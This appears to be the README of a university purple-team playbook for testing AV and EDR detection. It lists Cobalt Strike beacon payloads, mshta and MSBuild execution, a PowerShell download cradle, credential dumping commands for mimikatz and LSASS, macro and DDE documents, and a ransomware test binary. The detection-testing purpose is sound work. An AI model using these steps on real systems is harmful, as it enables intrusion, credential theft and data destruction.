# Purple Team Playbook for CSE566

*WARNING: This repo contains files many AV products including Windows Defender will find malicious. Do not download on a production system*

- This playbook is a quick and dirty purple team campaign developed for an infosec course
- The goal of this Purple Team Campaign is to compare detection capabilites for different AV (or EDR) products. All test cases will force on the endpoint
- Many of the payloads utilize Cobalt Strike. This is a paid commerical product, however, it should be easier enough modify the given playbook for open source tools such as Metasploit 
- Compiled payloads for Cobalt Strike Beacon assume a reverse http listener located at IP 192.168.56.102 (VirtualBox host-only network). These binaries are simple examples. Feel free to recompile following the provided instructions,
- The test cases roughly align to the MITRE ATT&CK framework. Unfortunately, they haven't been fully updated to align exactly to the latest release

## Execution Test Cases (basic)

### Test 1 - Client-side - Compiled Payload (Cobalt Strike)

(note: Cobalt Strike is a commerical product. Similar tests can be performed with Metasploit)

1. On Cobalt Strike teamserver, create listener by clicking the headphone icon in the toolbar. A basic HTTP listen is all that is required for this test. See documentation for more details https://www.cobaltstrike.com/downloads/csmanual40.pdf 
2. Generate executable payload in the Cobalt Strike toolbar -> attacks -> packages -> Windows Executable. Select the listener you created in step one and click generate.
    - Link to pre-genereated payload used for this test [beacon.exe](./payloads/beacon.exe)
3. Copy generated payload to target system.
4. Execute payload on target host as admin either through an elevated prompt or by right-clicking and running as administrator

### Test 2 - Client-side - Encrypted Payload (Cobalt Strike)
1. Server setup is the same as above
2. Encrypt payload using SPEGO from https://github.com/schladt/spego/releases. 
    - You only need the the SPEGO binary for the machine running Cobalt Strike along with example-config.yaml
    - Link to pre-generated encrypted payload used for this test: [encrypted-beacon.exe](./payloads/encrypted-beacon.exe) 

7. Copy the output executable from SPEGO to the target host

8. Set any environment variables. Powershell example for the pre-generated payload: 
```
$ ENV:SPEGOPASS='password'
```
9. Execute payload on target host as admin either through an elevated prompt or by right-clicking and running as administrator

### Test 3 - Process Creation Using MSBuild

(note: requires .NET4.0 or higher to be installed on target system)

1. Upload [T1127.csproj](./payloads/T1127.csproj) to target system. This can be accomplished with the Cobalt Strike Beacon upload feature, via Powershell's Invoke-Webrequest, or any other method desired
2. Run MSBuild with cmd.exe 
- ```C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.csproj```

    or via Cobalt Strike Beacon:

- ```beacon> shell c:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.csproj```


### Test 4 - Client Side - Locally executed .HTA Script
1. On the target machine download the [T1170.hta](./payloads/T1170.hta) to a local folder.
2. Execute ```mshta.exe {full_path}/T1170.hta``` note: FULL path is required. NO relative paths will work

### Test 5 - Script Download - Remote Hosted .HTA Script
1. On a web server reachable by the target, host [script.sct](./payloads/script.sct) for MSHTA to download and execute.
2. Execute ```mshta.exe {file_url}``` replacing {file_url} with the URL of the hosted script.

### Test 6 - Client Side - Locally executed .PS1 Script

1. On the target machine download [Invoke-DownloadCradle.ps1](./payloads/Invoke-DownloadCradle.ps1) to a local folder on the target system.
2. From a Powershell shell execute ".\Invoke-DownloadCradle.ps1" -- this requires "Set-ExecutionPolicy unrestricted" if not already set.

## Credential Dumping (https://attack.mitre.org/techniques/T1003/)
### Test 7 - Extract SAM Hashes via Beacon Hashdump
1. Use Cobalt Strike Beacon
2. Set ```sleep 0```
3. Execute ``` hashdump ```

### Test 8 - Extract Logonpasswords via Beacon Logonpasswords
1. Use Cobalt Strike Beacon
2. Set ```sleep 0```
3. Execute ``` logonpasswords ```

### Test 9 - Extract Logonpasswords via Mimikatz Binary

1. Upload encrypted [mimikatz package](./payloads/mk-2.2.0.7z) to target system. This can be accomplished via USB transfer, web download, or any other suitable transfer method.
2. Use 7 zip to extract the password protected file. The password is ```malware```
3. Open an administrator terminal (right click 'run as administrator') and navigate to the directory created in the previous step. If on a 64 bit system, navigate to the x64 directory \mk-2.2.0\x64\
4. Enter the following commands
```
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

### Test 10 - Extract LSASS memory via Dumpert

1. (optional) Compile new version of Outflank Dumpert from source using Visual Studio https://github.com/outflanknl/Dumpert. Make sure you set the target build to 'Release'.
2. (optional) Encrypt dumpert executable using SPEGO https://github.com/schladt/spego
3. Copy dumpert executable to target system via any means available (usb, web transfer, etc). A password protected 7z file is included in this repo at [Dumpert.7z](./payloads/dumpert.7z). The password for this file is ```malware```
4. Open an administrive terminal such as powershell.
5. Navigate to the location of dumpert.exe on the target system and execute dumpert.exe

## Execution - Intermediate 
### Test 11 - Inter-Process Communication - Dynamic Data Exchange
1. In modern versions on MS Office DDE is disabled by default. For the purpose of purple team testing, we will enable this feature (becuase who knows what the users have enabled and social engineering is a plausible work-around). In Excel, perform the following:

    ```File → Options → Trust Center → Trust Center Settings → External Content → Enable Dynamic Data Exchange Server Launch```
2. Copy [dde.xlsx](./payloads/dde.xlsx) to the remote system
3. Open and accept all warnings

### Test 12 - Command and Scripting Interpreter: Visual Basic (via Cobalt Strike)
1. Generate macro code from Cobalt Strike GUI
    ```Attacks -> Packages -> MS Office Application -> {select listener} -> Generate```
2. Follow the Macro Instruction
    - optionally, download pre-generated payload used for this campaign [beacon.docm](./payloads/beacon.docm)
3. Copy file to target system
4. Open and enable macros 

### Test 13 - Ransomware Payload
1. WARNING THIS TEST IS VERY DISTRUPTIVE AND IT IS HIGHLY RECOMMENDED TO BE EXECUTED ON SNAPSHOTTED VIRTUAL MACHINE
2. Source code for test ransomeware can be found at [ransom.go](.payloads/ransom.go)
3. Executable found at [ransom.exe](.payloads/ransom.exe)
4. Copy executable to target system
5. Execute with ```ransom.exe {root directory}``` where {root directory} is an optional directory to encrypt recursively
6. ransom.exe will walk the root directory and look for files with several pre-defined extensions.  
